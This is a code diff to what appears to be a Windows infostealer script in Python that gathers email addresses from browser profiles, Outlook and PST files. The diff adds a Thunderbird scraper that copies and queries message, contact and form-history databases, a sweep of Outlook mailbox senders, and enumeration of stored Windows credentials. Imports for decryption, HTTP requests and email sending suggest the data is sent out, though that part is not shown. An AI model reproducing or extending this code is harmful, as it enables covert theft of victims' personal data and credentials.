@@ -6,7 +6,7 @@ import winreg
 import time
 import base64
 import getpass
-from win32com.client import Dispatch
+import requests, win32cred, win32com.client
 from win32.win32crypt import CryptUnprotectData
 from Crypto.Cipher.AES import new, MODE_GCM
 from email.mime.multipart import MIMEMultipart
@@ -24,6 +24,7 @@ EDGE_BROWSER = 'edge'
 chrome_path  = os.path.join(os.getenv('LOCALAPPDATA'),'Google', 'Chrome', 'User Data')
 edge_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data')
 firefox_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
+thunderbird_path = os.path.join(os.getenv('APPDATA'), 'thunderbird', 'Profiles')
 local_state_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Local State')
 email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
 #os.system("taskkill /F /IM chrome.exe /IM msedge.exe /IM firefox.exe >nul 2>&1")
@@ -306,15 +307,79 @@ def firefox(firefox_path, email_pattern):
 
     return emails
 
+def thunderbird(thunderbird_path, email_pattern):
+    emails = []
+    for profile in os.listdir(thunderbird_path):
+        profile_name = profile.replace(" ", "_")
+        gmd = os.path.join(thunderbird_path, profile, 'global-messages-db.sqlite')
+        tgmd = os.path.join(os.getenv('TEMP'), f"gmd_{USERNAME}_{profile_name}_thunderbird.db")
+        tfh = os.path.join(thunderbird_path, profile, 'formhistory.sqlite')
+        ttfh = os.path.join(os.getenv('TEMP'), f"tfh_{USERNAME}_{profile_name}_thunderbird.db")
+        pl = os.path.join(thunderbird_path, profile, 'places.sqlite')
+        tpl = os.path.join(os.getenv('TEMP'), f"pl_{USERNAME}_{profile_name}_thunderbird.db")
+        if os.path.exists(gmd):
+            os.system(f'copy "{gmd}" "{tgmd}"')
+            conn = sqlite3.connect(tgmd)
+            cur = conn.cursor()
+            cur.execute("SELECT name FROM contacts")
+            for val in cur.fetchall():
+                try:
+                    emails.extend(re.findall(email_pattern, val[0]))
+                except: pass
+            cur.execute("SELECT subject FROM conversations")
+            for val in cur.fetchall():
+                try: emails.extend(re.findall(email_pattern, val[0]))
+                except: pass
+            cur.execute("SELECT c0subject FROM conversationsText_content")
+            for val in cur.fetchall():
+                try: emails.extend(re.findall(email_pattern, val[0]))
+                except: pass
+            cur.execute("SELECT value FROM identities")
+            for val in cur.fetchall():
+                try: emails.extend(re.findall(email_pattern, val[0]))
+                except: pass
+            cur.execute("SELECT c0body, c1subject, c2attachmentNames, c3author, c4recipients FROM messagesText_content")
+            for val in cur.fetchall():
+                try:
+                    emails.extend(re.findall(email_pattern, urllib.parse.unquote(val[0])))
+                    emails.extend(re.findall(email_pattern, val[1]))
+                    emails.extend(re.findall(email_pattern, val[2]))
+                    emails.extend(re.findall(email_pattern, urllib.parse.unquote(val[3])))
+                    emails.extend(re.findall(email_pattern, urllib.parse.unquote(val[4])))
+                except:
+                    pass
+            conn.close()
+        if os.path.exists(tfh):
+            os.system(f'copy "{tfh}" "{ttfh}"')
+            conn = sqlite3.connect(ttfh)
+            cur = conn.cursor()
+            cur.execute("SELECT value FROM moz_formhistory WHERE value LIKE '%@%'")
+            for val in cur.fetchall():
+                try: emails.extend(re.findall(email_pattern, val[0]))
+                except: pass
+            conn.close()
+        if os.path.exists(pl):
+            os.system(f'copy "{pl}" "{tpl}"')
+            conn = sqlite3.connect(tpl)
+            cur = conn.cursor()
+            cur.execute("SELECT url FROM moz_places WHERE url LIKE '%@%'")
+            for val in cur.fetchall():
+                try: emails.extend(re.findall(email_pattern, urllib.parse.unquote(val[0])))
+                except: pass
+            conn.close()
+    return emails
+                    
+
 chrome_emails = chromEdgeOnly(chrome_path, email_pattern, CHROME_BROWSER)
 edge_emails = chromEdgeOnly(edge_path, email_pattern, EDGE_BROWSER)
 firefox_emails = firefox(firefox_path, email_pattern)
+thunderbird_emails = thunderbird(thunderbird_path, email_pattern)
 
-emails = chrome_emails + edge_emails + firefox_emails
+emails = chrome_emails + edge_emails + firefox_emails + thunderbird_emails
 
 try:
     # Method 1: Outlook COM API
-    outlook = Dispatch("Outlook.Application").GetNamespace("MAPI")
+    outlook = win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")
     for account in outlook.Accounts:
         emails.append(account.CurrentUser.Address)
     # Method 2: Raid PST files from registry
@@ -329,6 +394,22 @@ try:
                 emails.extend(re.findall(email_pattern.encode('utf-8'), data))
         except: pass
 except: pass 
+
+try:
+    outlook = win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")
+    for folder in outlook.Folders:
+        for item in folder.Items:
+            if item.Class == 43:
+                emails.extend(item.SenderEmailAddress)
+except: pass 
+
+try:
+    creds = win32cred.CredEnumerate(None, 0)
+    for cred in creds:
+        emails.extend(re.findall(email_pattern, cred['TargetName']))
+        emails.extend(re.findall(email_pattern, cred['UserName']))
+except Exception as e:
+    print(f"ERROR FETCHING WIN CREDS : {e}")
 
 emails = list(set(emails))
 
